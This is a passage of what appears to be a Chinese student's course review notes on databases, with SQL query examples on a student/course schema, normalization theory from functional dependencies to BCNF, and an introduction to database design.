class="keyword">count</span>(cno) <span class="keyword">as</span> 选课数 <span class="keyword">from</span> sc <span class="keyword">where</span> sno <span class="keyword">between</span> <span class="string">'091501'</span> <span class="keyword">and</span> <span class="string">'091506'</span> <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">count</span>(cno) &gt;= <span class="string">'3'</span>;</span><br></pre></td></tr></table></figure><h2 id="3-5-多表查询"><a href="#3-5-多表查询" class="headerlink" title="3.5 多表查询"></a>3.5 多表查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//eg</span><br><span class="line">//查询选修180101号课程且成绩在90分以上的学生学号，姓名及成绩。</span><br><span class="line"><span class="keyword">select</span> s.sno,sname,grade </span><br><span class="line"><span class="keyword">from</span> s,sc </span><br><span class="line"><span class="keyword">where</span> s.sno=sc.sno <span class="keyword">and</span> sc.cno=<span class="string">'180101'</span> <span class="keyword">and</span> sc.grade &gt; <span class="number">90</span>;</span><br><span class="line">//查询选修了数据库原理课程的学生的姓名和成绩。</span><br><span class="line"><span class="keyword">select</span> cname,grade</span><br><span class="line"><span class="keyword">from</span> s</span><br><span class="line"><span class="keyword">join</span> sc <span class="keyword">on</span> sc.sno=s.sno</span><br><span class="line"><span class="keyword">join</span> c <span class="keyword">on</span> sc.cno=c.cno</span><br><span class="line"><span class="keyword">where</span> cname = <span class="string">"数据库原理"</span></span><br><span class="line">//统计每一门课的平均分</span><br><span class="line"><span class="keyword">select</span> cname,<span class="keyword">AVG</span>(grade) <span class="keyword">as</span> 平均分</span><br><span class="line"><span class="keyword">from</span> c,sc</span><br><span class="line"><span class="keyword">where</span> c.cno=sc.cno</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> cno,cname;</span><br><span class="line">//查询平均分高于90分的学生的学号、姓名以及他的平均分，并按平均分降序排列。</span><br><span class="line"><span class="keyword">select</span> sno,sname,<span class="keyword">AVG</span>(grade) <span class="keyword">as</span> 平均分</span><br><span class="line"><span class="keyword">from</span> s,sc</span><br><span class="line"><span class="keyword">where</span> s.sno=sc.sno</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sno,sname</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">AVG</span>(grade) &gt; <span class="number">90</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">AVG</span>(grade) <span class="keyword">desc</span>;</span><br><span class="line"></span><br><span class="line">//Limit [offset,] count</span><br><span class="line">//查询平均分高于90分的前五名学生的学号、姓名以及他的平均分</span><br><span class="line"><span class="keyword">select</span> sno,sname,<span class="keyword">AVG</span>(grade)</span><br><span class="line"><span class="keyword">from</span> s,sc</span><br><span class="line"><span class="keyword">where</span> s.sno=sc.sno</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sno,sname</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">AVG</span>(grade) &gt; <span class="number">90</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">//自连接</span><br><span class="line">//查询和王丽在同一个学院学习的学生的姓名。</span><br><span class="line"><span class="keyword">select</span> s2.sname</span><br><span class="line"><span class="keyword">from</span> s <span class="keyword">as</span> s1,s <span class="keyword">as</span> s2</span><br><span class="line"><span class="keyword">where</span> s1.sname=<span class="string">"王丽"</span> <span class="keyword">and</span> s1.学院=s2.学院;</span><br></pre></td></tr></table></figure><h2 id="3-6-嵌套查询"><a href="#3-6-嵌套查询" class="headerlink" title="3.6 嵌套查询"></a>3.6 嵌套查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">//查询与王丽在同一个学院学习的学生的学号和姓名</span><br><span class="line"><span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> 学院 <span class="keyword">IN</span>(</span><br><span class="line"><span class="keyword">select</span> 学院</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> sname=<span class="string">"王丽"</span></span><br><span class="line">)</span><br><span class="line">//查询没有选修数据库原理课程的学生的学号和姓名。</span><br><span class="line"><span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> sno <span class="keyword">NOT</span> <span class="keyword">IN</span>(</span><br><span class="line"><span class="keyword">select</span> sno</span><br><span class="line"><span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> cno <span class="keyword">IN</span>(</span><br><span class="line">    <span class="keyword">select</span> cno</span><br><span class="line">    <span class="keyword">from</span> c</span><br><span class="line">    <span class="keyword">where</span> cname=<span class="string">"数据库原理"</span></span><br><span class="line">))</span><br><span class="line">//集函数作用对象</span><br><span class="line">无<span class="keyword">where</span>就是整张表</span><br><span class="line">有<span class="keyword">where</span>就是行</span><br><span class="line">有分组，就是分组</span><br><span class="line">//<span class="keyword">exists</span></span><br><span class="line"><span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> sc,c</span><br><span class="line"><span class="keyword">where</span> sc.cno=c.cno <span class="keyword">and</span> cname=<span class="string">"数据库原理"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="3-7-集合和除运算"><a href="#3-7-集合和除运算" class="headerlink" title="3.7 集合和除运算"></a>3.7 集合和除运算</h2><p><strong>集合操作的各查询结果的列数必须相同，对应项的数据类型也必须相同。</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">//并运算</span><br><span class="line">//查询选修了180101号或180102号课程或二者都选修了的学生学号、课程号和成绩。</span><br><span class="line">(<span class="keyword">select</span> sno,cno,grade</span><br><span class="line"><span class="keyword">from</span> sc </span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180101"</span>)</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">(<span class="keyword">select</span> sno,cno,grade</span><br><span class="line"><span class="keyword">from</span> sc </span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180102"</span>);</span><br><span class="line">//差运算</span><br><span class="line">//查询选修了180101号或180102号课程或二者都选修了的学生学号、课程号和成绩。</span><br><span class="line">(<span class="keyword">select</span> cno,sno,grade</span><br><span class="line"><span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180101"</span>)</span><br><span class="line"><span class="keyword">except</span></span><br><span class="line">(<span class="keyword">select</span> cno,sno.grade</span><br><span class="line"><span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180102"</span>);</span><br><span class="line">//除运算</span><br><span class="line">//中间一层为小集合，最内一层为大集合</span><br><span class="line">//查询了选修全部课程的姓名</span><br><span class="line"><span class="keyword">select</span> sname</span><br><span class="line"><span class="keyword">from</span> s </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line">    <span class="keyword">from</span> c </span><br><span class="line">    <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line">    <span class="keyword">select</span> * </span><br><span class="line">        <span class="keyword">from</span> sc </span><br><span class="line">    <span class="keyword">where</span> sc.cno=c.cno <span class="keyword">and</span> s.sno=sc.sno));</span><br><span class="line">//查询至少选修了091501号学生选修的全部课程的学生的姓名</span><br><span class="line"><span class="keyword">select</span> sname</span><br><span class="line"><span class="keyword">from</span> s</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> sc <span class="keyword">as</span> <span class="keyword">first</span></span><br><span class="line"> <span class="keyword">where</span> first.sno=<span class="string">"091501"</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line">     <span class="keyword">select</span> * </span><br><span class="line">        <span class="keyword">from</span> sc <span class="keyword">as</span> <span class="keyword">second</span></span><br><span class="line">     <span class="keyword">where</span> first.cno=second.cno <span class="keyword">and</span> second.sno=s.sno));</span><br></pre></td></tr></table></figure><h2 id="3-8-数据更新和控制"><a href="#3-8-数据更新和控制" class="headerlink" title="3.8 数据更新和控制"></a>3.8 数据更新和控制</h2><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><ol><li>insert</li><li>update</li><li>delete</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">insert</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student</span><br><span class="line"><span class="keyword">values</span>(<span class="string">"xx"</span>,<span class="string">"xx"</span>,<span class="string">"xx"</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sc(sno,cno)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">"081010"</span>,<span class="string">"101"</span>);</span><br><span class="line"></span><br><span class="line">//<span class="keyword">update</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">table</span></span><br><span class="line"><span class="keyword">set</span> grade=grade+<span class="number">1</span></span><br><span class="line"><span class="keyword">where</span> sno <span class="keyword">in</span>(</span><br><span class="line"><span class="keyword">select</span> sno</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> 学院=<span class="string">"计算机"</span>);</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">table</span></span><br><span class="line"><span class="keyword">set</span> grade=grade+<span class="number">1</span></span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> 学院=<span class="string">"计算机"</span> <span class="keyword">and</span> s.sno=sc.sno);</span><br><span class="line"></span><br><span class="line">//<span class="keyword">delete</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span></span><br><span class="line"><span class="keyword">where</span> sno=<span class="string">"101"</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line">    <span class="keyword">from</span> s</span><br><span class="line"><span class="keyword">where</span> sc.sno=s.sno <span class="keyword">and</span> 学院=<span class="string">"计算机"</span>)</span><br></pre></td></tr></table></figure><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">grant</span></span><br><span class="line">//把学生表的查询权限授予用户User1</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">select</span> <span class="keyword">on</span> <span class="keyword">table</span> student <span class="keyword">to</span> user1;</span><br><span class="line">//DBA把在数据库SMD中建立表的权限授予用户User3。</span><br><span class="line"><span class="keyword">GRANT</span> createtab <span class="keyword">on</span> <span class="keyword">database</span> smd <span class="keyword">to</span> User3;</span><br><span class="line">//把学习表的全部权限授予全部用户。</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> <span class="keyword">table</span> sc <span class="keyword">to</span> <span class="keyword">public</span>;</span><br><span class="line">//<span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>可以把权限授予其他人</span><br><span class="line">//把用户User6对学生表的<span class="keyword">INSERT</span>权限收回</span><br><span class="line">//<span class="keyword">revoke</span> <span class="keyword">insert</span> <span class="keyword">on</span> <span class="keyword">table</span> student <span class="keyword">from</span> user6;</span><br></pre></td></tr></table></figure><h2 id="3-9-视图"><a href="#3-9-视图" class="headerlink" title="3.9 视图"></a>3.9 视图</h2><p>概念:视图是从一个或几个基本表（或视图)导出的表。</p><p>视图也称为虚表或者虚关系:只存放视图的定义。</p><h3 id="定义视图"><a href="#定义视图" class="headerlink" title="定义视图"></a>定义视图</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span></span><br><span class="line">&lt;视图名&gt; [(&lt;列名&gt; [，&lt;列名&gt;]…)]</span><br><span class="line"><span class="keyword">AS</span> &lt;子查询&gt;</span><br><span class="line">[<span class="keyword">WITH</span> <span class="keyword">CHECK</span> <span class="keyword">OPTION</span>]；</span><br><span class="line"></span><br><span class="line">//计算机学院学生的视图</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> CS_STU</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> 学院=<span class="string">"计算机"</span>;</span><br></pre></td></tr></table></figure><h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> cs_stu</span><br></pre></td></tr></table></figure><h1 id="0x04-第四章-规范化理论"><a href="#0x04-第四章-规范化理论" class="headerlink" title="0x04 第四章 规范化理论"></a>0x04 第四章 规范化理论</h1><h2 id="4-1-规范化概述"><a href="#4-1-规范化概述" class="headerlink" title="4.1 规范化概述"></a>4.1 规范化概述</h2><h2 id="4-2-函数依赖"><a href="#4-2-函数依赖" class="headerlink" title="4.2 函数依赖"></a>4.2 函数依赖</h2><p>X相等，Y一定相等。若X不等，Y可等可不等。</p><p><img src="/2021/05/03/Database-review/image-20210506211418905.png" alt="image-20210506211418905"></p><p>如果X→Y，但Y不为X的子集，则称X→Y是<strong>非平凡的函数依赖</strong></p><p>若X→Y，但Y属于X, 则称X→Y是<strong>平凡的函数依赖</strong></p><h3 id="完全函数依赖："><a href="#完全函数依赖：" class="headerlink" title="完全函数依赖："></a><strong>完全函数依赖</strong>：<img src="/2021/05/03/Database-review/20190629193601651.png" alt="img"></h3><h3 id="部分函数依赖："><a href="#部分函数依赖：" class="headerlink" title="部分函数依赖："></a>部分函数依赖：<img src="/2021/05/03/Database-review/20190629193601806.png" alt="img"></h3><p><img src="/2021/05/03/Database-review/20190629193609721.png" alt="img"></p><p>上图中<img src="/2021/05/03/Database-review/20190629193615156.png" alt="img"> 是完全函数依赖，</p><p><img src="/2021/05/03/Database-review/20190629193615144.png" alt="img"> 是部分数依赖，因为Sno→Sdept成立，而Sno是Sno，Cno的真子集</p><h3 id="传递函数依赖"><a href="#传递函数依赖" class="headerlink" title="传递函数依赖"></a><strong>传递函数依赖</strong></h3><p>定义:在R(U)中，如果X→Y，Y不包含于X即Y不是X的子集，Y不→X，Y→Z,则称Z对X传递函数依赖。</p><h3 id="码的函数依赖定义"><a href="#码的函数依赖定义" class="headerlink" title="码的函数依赖定义"></a>码的函数依赖定义</h3><p><strong>候选码和主码</strong></p><p><img src="/2021/05/03/Database-review/image-20210506215255533.png" alt="image-20210506215255533"></p><p><strong>主属性和非主属性</strong></p><p><img src="/2021/05/03/Database-review/image-20210506215233325.png" alt="image-20210506215233325"></p><p><strong>外码</strong><img src="/2021/05/03/Database-review/image-20210506215400654.png" alt="image-20210506215400654"></p><p><strong>超码</strong></p><p><img src="/2021/05/03/Database-review/image-20210506215557064.png" alt="image-20210506215557064"></p><h2 id="4-3-范式"><a href="#4-3-范式" class="headerlink" title="4.3 范式"></a>4.3 范式</h2><h3 id="1NF"><a href="#1NF" class="headerlink" title="1NF"></a>1NF</h3><p>如果一关系模式r(R)的每个属性对应的域值都是不可分的(即原子的)，则称r(R)属于第一范式，记为r(R)Î1NF.</p><p>第一范式的目标是：将基本数据划分成称为实体集或表的逻辑单元，当设计好每个实体后，需要为其指定主码。</p><p><img src="/2021/05/03/Database-review/20190629193650963.png" alt="img"></p><p>第一范式是对关系模式的最起码的要求。不满足第一范式的数据库模式不能称为关系数据库</p><h3 id="2NF"><a href="#2NF" class="headerlink" title="2NF"></a>2NF</h3><p>若关系模式R∈1NF，并且每一个非主属性都完全函数依赖于任何一个候选码，则R∈2NF。</p><p>第二范式的目标：将只部分依赖于候选码（即依赖于候选码的部分属性）的非主属性移到其他表中。</p><p>S-L-C这个函数依赖图中非主属性Sdept和Sloc部分函数依赖于码(Sno, Cno)</p><p><img src="/2021/05/03/Database-review/20190629193705542.png" alt="img"></p><p>将其分为两个表后使得非主属性对其各自的码都是完全函数依赖</p><p><img src="/2021/05/03/Database-review/20190629193713265.png" alt="img"></p><p>2NF范式虽然消除了由于非主属性对候选码的部 分依赖所引起的冗余及各种异常，但并没有排除传递依赖。因此，还需要对其进一步规范化</p><h3 id="3NF"><a href="#3NF" class="headerlink" title="3NF"></a>3NF</h3><p><strong>3NF必定是2NF</strong></p><p>若R∈3NF，则每一个非主属性既不部分依赖于码也不传递依赖于码</p><p>第三范式的目标：去掉表中不直接依赖于候选码的非主属性</p><p><img src="/2021/05/03/Database-review/20190629193726860.png" alt="img"></p><p>Sno→Sdept  Sdept → Sno  Sdept→Sloc 可得： Sno→Sloc，即S-L中存在非主属性对码的传递函数依 赖，S-L ∉ 3NF</p><p>采用投影分解法，把S-L分解为两个关系模式，以消除传递函数依赖：</p><p><img src="/2021/05/03/Database-review/20190629193735197.png" alt="img"></p><p>eg:</p><ol><li>先找谁能决定U</li><li>之后看是否有部分函数依赖(1NF,2NF)</li><li>最后看是否有传递函数依赖(2NF,3NF)</li></ol><h2 id="4-4-BCNF-4NF"><a href="#4-4-BCNF-4NF" class="headerlink" title="4.4 BCNF 4NF"></a>4.4 BCNF 4NF</h2><h3 id="BCNF"><a href="#BCNF" class="headerlink" title="BCNF"></a>BCNF</h3><p>通常认为BCNF是修正的第三范式，有时也称为扩充的第三范式。</p><p>一个满足BCNF的关系模式有：</p><p>所有非主属性都完全函数依赖于每个候选码<br>所有的主属性都完全函数依赖于每个不包含它的候选码<br>没有任何属性完全函数依赖于非码的任何一组属性<br>BCNF范式排除了：</p><p>任何属性(包括主属性和非主属性)对候选码的部分依赖和传递依赖；<br>主属性之间的传递依赖。<br>例子：</p><p>关系模式STJ(S,T,J)中，S表示学生，T表示教师，J表示课程。每一教师只教一门课，</p><p>每门课有若干教师，某一学生选定某门课，就对应一个固定的教师。</p><p>由语义可得到函数依赖：(S,J)→T；(S,T)→J；T→J</p><p>因为没有任何非主属性对码传递依赖或部分依赖，</p><p>STJ ∈ 3NF。</p><p>因为T是决定因素，而T不包含码，所以STJ 不属于 BCNF 关系。</p><p><img src="/2021/05/03/Database-review/20190629193928110.png" alt="img"></p><p><strong>结论：</strong></p><ol><li>任何一个二目关系都是BCNF</li><li>关系模式R中属性全部是主属性，则R的最低范式必定是 至少达到第三范式</li></ol><h2 id="4-5-Armstrong公理系统"><a href="#4-5-Armstrong公理系统" class="headerlink" title="4.5 Armstrong公理系统"></a>4.5 Armstrong公理系统</h2><h3 id="独立推理规则"><a href="#独立推理规则" class="headerlink" title="独立推理规则"></a>独立推理规则</h3><p><strong>自反律</strong></p><p><img src="/2021/05/03/Database-review/image-20210506230123348.png" alt="image-20210506230123348"></p><p><strong>增广律</strong></p><p><img src="/2021/05/03/Database-review/image-20210506230337823.png" alt="image-20210506230337823"></p><h3 id="传递律"><a href="#传递律" class="headerlink" title="传递律"></a>传递律</h3><p><img src="/2021/05/03/Database-review/image-20210506230430664.png" alt="image-20210506230430664"></p><ol><li>Y属于X,X-&gt;Y</li><li>Z属于U,X-&gt;Y,有XZ-&gt;YZ</li><li>X-&gt;Y和Y-&gt;Z,有X-&gt;Z</li></ol><p>几个推论</p><ol><li>X-&gt;Y,X-&gt;Z 有 X-&gt;YZ</li><li>X-&gt;Y Z属于Y 有X-&gt;Z</li><li>X-&gt;Y,WY-&gt;Z,有XW-&gt;Z</li></ol><h3 id="属性集的闭包"><a href="#属性集的闭包" class="headerlink" title="属性集的闭包"></a>属性集的闭包</h3><p><img src="/2021/05/03/Database-review/image-20210506233112332.png" alt="image-20210506233112332"></p><h2 id="4-6-最小函数依赖集"><a href="#4-6-最小函数依赖集" class="headerlink" title="4.6 最小函数依赖集"></a>4.6 最小函数依赖集</h2><h3 id="函数依赖集等价"><a href="#函数依赖集等价" class="headerlink" title="函数依赖集等价"></a>函数依赖集等价</h3><p>设F和G是函数依赖集，若F闭包=G闭包，则F和G等价。</p><p><strong>F的闭包=G的闭包的充分必要条件是F是G闭包的子集，G是F闭包的子集。</strong></p><p>eg：</p><p><img src="/2021/05/03/Database-review/image-20210507153146293.png" alt="image-20210507153146293"></p><h3 id="最小函数依赖集"><a href="#最小函数依赖集" class="headerlink" title="最小函数依赖集"></a><strong>最小函数依赖集</strong></h3><p>定义需要满足三个条件：</p><ol><li>右部都是单属性</li><li>F-A之后记为F1，且F1不与F等价</li><li>对于多个属性决定，要判断每一属性不是冗余的。</li></ol><h3 id="F的最小依赖集的算法"><a href="#F的最小依赖集的算法" class="headerlink" title="F的最小依赖集的算法"></a><strong>F的最小依赖集的算法</strong></h3><p><img src="/2021/05/03/Database-review/image-20210507154804795.png" alt="image-20210507154804795"></p><p>eg：</p><p><strong>函数依赖集F的最小覆盖可能有多个</strong></p><p><img src="/2021/05/03/Database-review/image-20210507155107652.png" alt="image-20210507155107652"></p><p><img src="/2021/05/03/Database-review/image-20210507155154422.png" alt="image-20210507155154422"></p><p><img src="/2021/05/03/Database-review/image-20210507155340685.png" alt="image-20210507155340685"></p><p><img src="/2021/05/03/Database-review/image-20210507155425864.png" alt="image-20210507155425864"></p><h2 id="4-7-码值理论"><a href="#4-7-码值理论" class="headerlink" title="4.7 码值理论"></a>4.7 码值理论</h2><p><img src="/2021/05/03/Database-review/image-20210507160245915.png" alt="image-20210507160245915"></p><p><img src="/2021/05/03/Database-review/image-20210507160155053.png" alt="image-20210507160155053"></p><p><strong>多属性依赖集候选关键字求解算法</strong></p><p><img src="/2021/05/03/Database-review/image-20210507161022110.png" alt="image-20210507161022110"></p><p><img src="/2021/05/03/Database-review/image-20210507161055600.png" alt="image-20210507161055600"></p><p><img src="/2021/05/03/Database-review/image-20210507161117962.png" alt="image-20210507161117962"></p><p>此外还有图论的方法。</p><p>简单来说就是两点</p><ol><li>先找X（L类和N类）和Y（R类和LR类），画好入度和出度。</li><li>然后逐个增加，直至找到回路。</li></ol><h2 id="4-8-模式分解"><a href="#4-8-模式分解" class="headerlink" title="4.8 模式分解"></a>4.8 模式分解</h2><p>没太看懂 等复习完再看</p><p><strong>判断分解的无损连接性</strong></p><p>直接看例子吧</p><p><img src="/2021/05/03/Database-review/image-20210507172917369.png" alt="image-20210507172917369"></p><h2 id="4-9-函数依赖保持性和模式分解算法"><a href="#4-9-函数依赖保持性和模式分解算法" class="headerlink" title="4.9 函数依赖保持性和模式分解算法"></a>4.9 函数依赖保持性和模式分解算法</h2><h3 id="关系模式的分解算法"><a href="#关系模式的分解算法" class="headerlink" title="关系模式的分解算法"></a>关系模式的分解算法</h3><p><strong>1.转换为3NF的保持函数依赖的分解</strong></p><p><img src="/2021/05/03/Database-review/image-20210507212116352.png" alt="image-20210507212116352"></p><p><img src="/2021/05/03/Database-review/image-20210507212123809.png" alt="image-20210507212123809"></p><p><strong>2.具有依赖保持和连接不失真的分解</strong></p><p><img src="/2021/05/03/Database-review/image-20210507212321618.png" alt="image-20210507212321618"></p><p><strong>3.结果为BCNF的连不失真分解</strong></p><p><img src="/2021/05/03/Database-review/image-20210507212741288.png" alt="image-20210507212741288"></p><h1 id="0x05-数据库设计"><a href="#0x05-数据库设计" class="headerlink" title="0x05 数据库设计"></a>0x05 数据库设计</h1><h2 id="5-1-数据库设计概述"><a href="#5-1-数据库设计概述" class="headerlink" title="5.1 数据库设计概述"></a>5.1 数据库设计概述</h2><p><strong>数据库设计</strong>：对于一个给定的应用环境，构造最优的数据库模式，建立数据库及其应用系统，使之能有效地存储数据，满足各种用户的信息需求（数据库内容及结构的要求，静态）与处理需求（数据库要进行的数据处理，动态）。</p><p><strong>设计方法</strong></p><ol><li>直观设计法</li><li>规范设计法（实体联系、基于3NF、基于视图概念）</li><li>计算机辅助设计法</li><li>自动化设计法</li></ol><h2 id="5-2-需求分析"><a href="#5-2-需求分析" class="headerlink" title="5.2 需求分析"></a>5.2 需求分析</h2><p><strong>分析重点</strong>：信息要求（DB中需存储的数据）、处理要求（用户要求的处理功能、处理响应时间的要求）、安全性与完整性要求</p><p><strong>调查需求步骤</strong>： </p><ol><li>分析用户活动，产生业务流程图</li><li>确定系统范围，产生业务范围图</li><li>分析用户活动及所设计的数据，产生数据流图（外部项、数据加工、数据存储、数据流）</li><li>分析系统数据，产生数据字典</li></ol><p><strong>数据字典</strong>：关于数据库中数据的描述，元数据，而不是数据本身 </p><p>数据项：是不可再分的数据单位 </p><p>数据结构：反映数据之间的组合关系 </p><p>数据流：数据结构在系统内传输的途径 </p><p>数据存储：数据结构停留或保存的地方，也是数据流的来源和去向之一 </p><p>处理过程：描述处理过程的说明性信息 </p><h2 id="5-3-数据库概念结构设计"><a href="#5-3-数据库概念结构设计" class="headerlink" title="5.3 数据库概念结构设计"></a>5.3 数据库概念结构设计</h2><p><strong>分类</strong>：自顶向下（集中模式设计）、自底向上（视图集成法）、混合策略（自底向上 、和自顶向下相结合）、逐步扩张（由内向外法）</p><p><strong>局部视图设计</strong>：通常以中层数据流图作为设计分E-R图的依据（找实体、找属性、找联系和类型） </p><p><strong>集成全局视图</strong>：模式之间的对应和冲突包括：属性冲突 （属性域冲突、取值单位冲突）、命名冲突（同名异义、异名同义）、结构冲突 ，可以修改视图使得相互一致或者合并视图或者重构。</p><h2 id="5-4-数据库逻辑结构设计"><a href="#5-4-数据库逻辑结构设计" class="headerlink" title="5.4 数据库逻辑结构设计"></a>5.4 数据库逻辑结构设计</h2><p>E-R图转换为关系模式，实质是将实体和联系转为关系模式。 </p><h3 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a><strong>一对一</strong></h3><ul><li><p>转换为新关系，每个实体的码均是该关系的候选码。 